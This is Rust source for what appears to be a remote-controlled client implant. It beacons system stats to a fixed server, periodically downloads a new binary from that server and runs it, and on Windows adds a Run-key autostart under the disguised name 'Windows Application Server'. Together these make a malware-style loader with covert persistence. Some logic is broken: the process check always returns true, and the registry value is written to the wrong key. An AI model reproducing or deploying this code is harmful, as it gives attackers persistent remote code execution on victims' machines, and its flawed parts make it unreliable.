#[macro_use]
extern crate lazy_static;

use std::time::{Duration, SystemTime, UNIX_EPOCH};
use std::ops::Add;
use std::thread::sleep;
use std::env::current_exe;
use std::fs::read;

use systemstat::{System, Platform, saturating_sub_bytes, DelayedMeasurement};

use shared::api::*;
use shared::error::*;
use shared::utils;
use std::fmt::Error;
use std::process::Command;
use sysinfo::{SystemExt, ProcessExt};

lazy_static! {

    // how often update will be checked
    static ref CHECK_UPDATE_TIMEOUT: Duration = {
        let secs = if cfg!(debug_assertions) {
            10
        } else {
            3600
        };

        Duration::from_secs(secs)
    };

    // how often heartbeats will be sent
    static ref HEARTBEATS_TIMEOUT: Duration = {
        let secs = if cfg!(debug_assertions) {
            5
        } else {
            60
        };

        Duration::from_secs(secs)
    };

    // own sha256
    static ref OWN_SHA256: String = {
        let path = current_exe().unwrap();
        let digest = utils::sha256(&read(path).unwrap());
        hex::encode(&digest)
    };

}

fn check_update(api: &mut Api) -> Result<Option<String>> {
    println!("checking update...");

    let info = api.client_info()?;
    if info.sha256 != OWN_SHA256.as_ref() {
        println!("downloading update...");

        let upload = api.client_download()?;
        println!("downloaded! storing on disk...");

        let binary_path = utils::save(upload)?;
        println!("successfully stored!");

        return Ok(Some(binary_path));
    }

    Ok(None) // no update
}

fn send_heartbeat(api: &mut Api) -> Result<()> {
    println!("sending heartbeat...");

    let sys = systemstat::System::new();
    let token = api.token();

    api.send_heartbeat(HeartbeatParameters {
        token,
        cpu_usage: sys.load_average().map(|x| x.one).unwrap_or(0f32),
        mem_usage: sys.memory().map(|x| x.total.0 - x.free.0).unwrap_or(0) as f32,
        timestamp: SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs() as i32
    })?;

    Ok(())
}

fn main_loop(api: &mut Api) -> Result<String> {
    let sys = systemstat::System::new();
    let info = SystemInfo {
        cpu_total: 0.0, // todo
        mem_total: sys.memory().map(|x| x.total.as_u64()).unwrap_or(0) as f32
    };

    api.login(&info)?;
    println!("logged in 1!");

    let mut next_check_update = SystemTime::now().add(CHECK_UPDATE_TIMEOUT.clone());
    let mut next_heartbeat = SystemTime::now();

    loop {
        // checking update...
        if SystemTime::now() > next_check_update {
            next_check_update = SystemTime::now().add(CHECK_UPDATE_TIMEOUT.clone());
            let binary_path = check_update(api)?;
            if let Some(binary_path) = binary_path {
                return Ok(binary_path);
            }
        }

        // sending heartbeat...
        if SystemTime::now() > next_heartbeat {
            next_heartbeat = SystemTime::now().add(HEARTBEATS_TIMEOUT.clone());
            send_heartbeat(api)?;
        }

        sleep(Duration::from_secs(1));
    }
}

fn should_run() -> bool {
    let mut system = sysinfo::System::new();
    system.refresh_all();

    for (pid, proc) in system.get_process_list() {
        if *pid as i32 == std::process::id() as i32 {
            continue;
        }

        if proc.name().ends_with(&*utils::NAME1) || proc.name().ends_with(&*utils::NAME2) {
            continue;
        }
    }

    true
}

#[cfg(windows)]
fn ensure_autorun(path: &str) -> Result<()> {
    let key = winreg::RegKey::predef(winreg::enums::HKEY_CURRENT_USER);
    key.open_subkey("\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")?;
    key.set_value("Windows Application Server".to_string(), &path.to_string())?;
    Ok(())
}

fn main() {
    utils::chdir();

    // check if we should continue?
    if !should_run() {
        return;
    }

    // new binary?
    if std::env::current_exe().unwrap().ends_with(&*utils::NAME2) {
        std::fs::copy(&*utils::NAME2, &*utils::NAME1).unwrap();
        Command::new(&*utils::NAME1).spawn().unwrap();
        return;
    }

    // ensure autorun
    #[cfg(windows)]
    if let Err(err) = ensure_autorun(&utils::NAME1) {
        println!("error: {}", err.to_string());
    }

    // main loop
    let mut api = Api::new("10.211.55.2", 8000, false);
    loop {
        match main_loop(&mut api) {
            Ok(binary_path) => {
                Command::new(binary_path).spawn().unwrap();
                return;
            }
            Err(err) => {
                println!("error: {}, restarting...", err.to_string());
                sleep(Duration::from_secs(5));
            }
        }
    }
}
